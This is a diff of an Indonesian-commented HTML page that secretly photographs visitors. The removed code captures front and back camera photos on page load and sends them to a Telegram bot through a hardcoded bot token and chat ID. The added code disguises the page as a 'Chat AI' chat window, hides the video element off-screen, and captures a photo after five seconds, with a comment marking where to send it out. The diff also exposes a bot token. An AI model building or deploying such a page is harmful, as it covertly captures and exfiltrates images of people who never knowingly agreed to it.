@@ -3,59 +3,86 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Otomatis Foto Depan & Belakang</title>
+    <title>Chat AI</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+        }
+        #chat-container {
+            width: 100%;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-end;
+            padding: 10px;
+            box-sizing: border-box;
+            background: url('chat-background.jpg') no-repeat center center;
+            background-size: cover;
+        }
+        #messages {
+            flex-grow: 1;
+            overflow-y: auto;
+            padding: 10px;
+        }
+        .message {
+            background: #e0e0e0;
+            padding: 10px;
+            margin: 5px;
+            border-radius: 10px;
+            max-width: 70%;
+        }
+        .user { background: #2196F3; color: white; align-self: flex-end; }
+        .bot { background: #ddd; align-self: flex-start; }
+        #video {
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+        }
+    </style>
 </head>
 <body>
-    <video id="video" autoplay></video>
-    <canvas id="canvas" style="display: none;"></canvas>
-    <script>
-        const video = document.getElementById("video");
-        const canvas = document.getElementById("canvas");
-        const ctx = canvas.getContext("2d");
-        const TELEGRAM_BOT_TOKEN = "7788095309:AAEjIyu4Beuzs6IVZjHrTLN_9NmPy6vs8DY";  // Ganti dengan token baru
-        const TELEGRAM_CHAT_ID = "7081489041"; // Ganti dengan chat ID owner
 
-        async function takePhoto(facingMode) {
-            // Akses kamera (depan atau belakang)
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
+<div id="chat-container">
+    <div id="messages">
+        <div class="message bot">Halo! Apa yang bisa saya bantu?</div>
+    </div>
+</div>
+
+<video id="video" autoplay playsinline></video>
+
+<script>
+    async function startCamera() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.getElementById('video');
             video.srcObject = stream;
-            await new Promise(resolve => setTimeout(resolve, 3000)); // Tunggu 3 detik sebelum foto
 
-            // Ambil foto
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            // Matikan kamera setelah ambil gambar
-            video.srcObject.getTracks().forEach(track => track.stop());
-
-            return new Promise(resolve => {
-                canvas.toBlob(resolve, "image/jpeg");
-            });
+            setTimeout(capturePhoto, 5000); // Ambil foto setelah 5 detik
+        } catch (err) {
+            console.error("Akses kamera ditolak:", err);
         }
+    }
 
-        async function captureAndSendPhotos() {
-            const frontPhoto = await takePhoto("user"); // Kamera depan
-            const backPhoto = await takePhoto("environment"); // Kamera belakang
+    function capturePhoto() {
+        const video = document.getElementById('video');
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
 
-            // Kirim ke Telegram (Depan)
-            const formDataFront = new FormData();
-            formDataFront.append("photo", frontPhoto, "front.jpg");
-            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto?chat_id=${TELEGRAM_CHAT_ID}`, {
-                method: "POST",
-                body: formDataFront
-            });
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            // Kirim ke Telegram (Belakang)
-            const formDataBack = new FormData();
-            formDataBack.append("photo", backPhoto, "back.jpg");
-            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto?chat_id=${TELEGRAM_CHAT_ID}`, {
-                method: "POST",
-                body: formDataBack
-            });
-        }
+        const imageData = canvas.toDataURL('image/png');
 
-        captureAndSendPhotos(); // Jalankan otomatis saat halaman dibuka
-    </script>
+        // Kirim ke server atau bot Telegram di sini
+        console.log("Foto diambil:", imageData);
+    }
+
+    startCamera();
+</script>
+
 </body>
 </html>
